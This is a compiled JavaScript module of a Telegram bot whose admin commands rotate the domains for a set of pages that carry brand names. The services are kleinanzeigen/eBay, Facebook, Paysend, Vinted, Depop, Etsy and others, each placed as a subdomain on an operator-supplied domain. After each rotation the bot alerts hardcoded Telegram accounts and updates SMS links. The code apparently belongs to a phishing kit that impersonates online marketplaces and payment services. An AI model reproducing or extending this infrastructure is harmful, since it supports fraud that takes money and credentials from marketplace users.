"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.composer = void 0;
const grammy_1 = require("grammy");
const database_1 = require("../../database");
const moment_1 = __importDefault(require("moment/moment"));
const config_1 = require("../../utils/config");
const console_1 = __importDefault(require("console"));
const setDomen_1 = require("../../handlers/admins/domens/setDomen");
const regex = /\/set maindomen (?<link>.+)/gmsi;
const regexEtsyDomen = /\/set etsydomen (?<link>.+)/gmsi;
const regexPro = /\/set prodomen (?<link>.+)/gmsi;
exports.composer = new grammy_1.Composer();
exports.composer.hears(regex, handler);
exports.composer.hears(regexEtsyDomen, handlerEtsy);
exports.composer.hears(regexPro, handler);
async function handler(ctx) {
    console_1.default.log("asd");
    const match = regex.exec(ctx.message.text);
    const matchPro = regexPro.exec(ctx.message.text);
    let link = undefined;
    let isPro = false;
    if (match?.groups?.link) {
        link = match?.groups?.link;
    }
    if (matchPro?.groups?.link) {
        isPro = true;
        link = matchPro?.groups?.link;
    }
    if (!isPro) {
        const domens = await database_1.domensRepository.find();
        for (const i in domens) {
            const domen = domens[i];
            if (domen.service === 'ebay' && domen.active) {
                domens[i].link = `kleinanzeigen.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'facebook' && domen.active) {
                domens[i].link = `facebook.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'paysend' && domen.active) {
                domens[i].link = `paysend.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'leboncoin' && domen.active) {
                domens[i].link = `leboncoin.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'etsy' && domen.active) {
                domens[i].link = `etsy.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'lonelypups' && domen.active && !domen.special) {
                domens[i].link = `lonelypups.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'jofogas' && domen.active) {
                domens[i].link = `jofogas.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'wallapop' && domen.active) {
                domens[i].link = `wallapop.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'vinted' && domen.active) {
                domens[i].link = `vinted.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'depop' && domen.active) {
                domens[i].link = `depop.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'willhaben' && domen.active) {
                domens[i].link = `willhaben.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
        }
        await database_1.domensRepository.save(domens);
        await ctx.api.sendMessage(config_1.config.chats.chat, `⚠️ Все домены были обновлены!`);
        await ctx.api.sendMessage(5933718791, `⚠️ Все домены были обновлены!\n\nNew Link: ${link}`);
        await (0, setDomen_1.updateSmsDomen)();
        return ctx.api.sendMessage(5685044944, `⚠️ Все домены были обновлены!\n\nNew Link: ${link}`);
    }
    if (isPro) {
        const domens = await database_1.proDomensRepository.find();
        for (const i in domens) {
            const domen = domens[i];
            if (domen.service === 'ebay' && domen.active) {
                domens[i].link = `kleinanzeigen.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'facebook' && domen.active) {
                domens[i].link = `facebook.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'jofogas' && domen.active) {
                domens[i].link = `jofogas.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'vinted' && domen.active) {
                domens[i].link = `vinted.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
            if (domen.service === 'depop' && domen.active) {
                domens[i].link = `depop.${link}`;
                domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
            }
        }
        await database_1.proDomensRepository.save(domens);
        await ctx.api.sendMessage(config_1.config.chats.chat, `⚠️ <b>[PRO]</b> Все домены были обновлены!`);
        await ctx.api.sendMessage(5933718791, `⚠️ <b>[PRO]</b> Все домены были обновлены!\n\nNew Link: ${link}`);
        await (0, setDomen_1.updateSmsDomen)();
        return ctx.api.sendMessage(5685044944, `⚠️ <b>[PRO]</b> Все домены были обновлены!\n\nNew Link: ${link}`);
    }
}
async function handlerEtsy(ctx) {
    const match = regexEtsyDomen.exec(ctx.message.text);
    let link = undefined;
    if (match?.groups?.link) {
        link = match?.groups?.link;
    }
    const domens = await database_1.domensRepository.find();
    for (const i in domens) {
        const domen = domens[i];
        if (domen.service === 'etsy' && domen.active) {
            domens[i].link = `etsy.${link}`;
            domens[i].dateChange = (0, moment_1.default)(Date.now()).format('YYYY-MM-DD HH:mm:ss');
        }
    }
    await database_1.domensRepository.save(domens);
    await ctx.api.sendMessage(config_1.config.chats.chat, `⚠️ Все домены были обновлены!`);
    await ctx.api.sendMessage(5933718791, `⚠️ Все домены были обновлены!\n\nNew Link: ${link}`);
    await (0, setDomen_1.updateSmsDomen)();
    return ctx.api.sendMessage(5685044944, `⚠️ Все домены были обновлены!\n\nNew Link: ${link}`);
}
